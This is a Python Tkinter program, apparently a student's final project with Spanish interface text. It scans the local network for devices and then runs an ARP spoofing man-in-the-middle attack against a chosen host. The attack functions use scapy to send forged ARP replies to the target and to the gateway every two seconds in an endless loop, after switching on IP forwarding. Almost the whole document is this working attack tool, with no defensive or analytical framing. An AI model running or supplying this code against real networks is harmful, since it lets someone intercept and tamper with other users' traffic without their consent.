from tkinter import *
import threading
import os
import re
from tkinter import ttk, messagebox
import scapy.all as scapy
import time

def get_mac(text):
    return re.findall(r'([\w]{2}(?::[\w]{2}){5})', text)

def get_ip(text):
    return re.findall('[0-9][0-9][0-9]\.[0-9][0-9][0-9]\.[0]\.\d*', text)

def devices():
    messagebox.showinfo(title='Espera', message='Ten paciencia se buscaran los dispositivos conectados a la red', )
    text = os.popen('sudo nast -g -i eth0').read()
    mac = get_mac(text)
    ip = get_ip(text)
    i = 0
    len_mac = len(mac)
    while i < len_mac:
        tv.insert("", END, text=i + 1, values=(ip[i], mac[i]))
        i += 1
    else:
        messagebox.showinfo(title='Listo', message='No se encontraron más dispositivos', )
        print ('no se encontraron más dispositivos')


def PrincipalThread():
    threading.Thread(target=devices).start()

def SecondThread():
    threading.Thread(target=select_item).start()

#Estilo predeterminados
txtStyle = ("Arial", 11, "bold")
colorPrincipal = '#fb0'

window = Tk()
window.title('Proyecto final')
window['bg'] = colorPrincipal

Label(window, text="IP: 192.168.0.16", fg = "white", bg = colorPrincipal, font = txtStyle).pack()
Label(window, text="MAC: 08:00:27:43:73:bc", fg = "white", bg = colorPrincipal, font = txtStyle).pack()
Button(window, text='Ver Dispositivos', command=PrincipalThread, bg='blue', fg='white', font = txtStyle).pack()

tv = ttk.Treeview(window, columns=("col1", "col2"))
tv.pack()

def select_item():
    selected = tv.focus()
    if selected == '':
        messagebox.showerror(title='Error', message='No ha seleccionado ningun dispositivo',)
    else:
        text = tv.item(selected, 'text')
        if text == 1:
            messagebox.showerror(title='Error', message='Este dispositivo no puede ser seleccionado',)
        else:
            ip = tv.item(selected, 'values')
            attack(ip[0])

def get_mac_attack(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst= target_ip, hwdst=get_mac_attack(target_ip), psrc=spoof_ip)
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    scapy.send(packet)

def attack(ip):
    print(ip)
    sent_packets_count = 0
    while True:
        spoof(ip, "192.168.0.1")
        spoof("192.168.0.1", ip)
        sent_packets_count = sent_packets_count + 1
        time.sleep(2)

tv.column("#0", width=160)
tv.column("col1", width=160, anchor=CENTER)
tv.column("col2", width=200, anchor=CENTER)

tv.heading("#0", text="Id", anchor=CENTER)
tv.heading("col1", text="IP", anchor=CENTER)
tv.heading("col2", text="MAC", anchor=CENTER)

Button(window, text='Hacer Seguimiento', command=SecondThread, bg='blue', fg='white', font = txtStyle).pack()

window.mainloop()

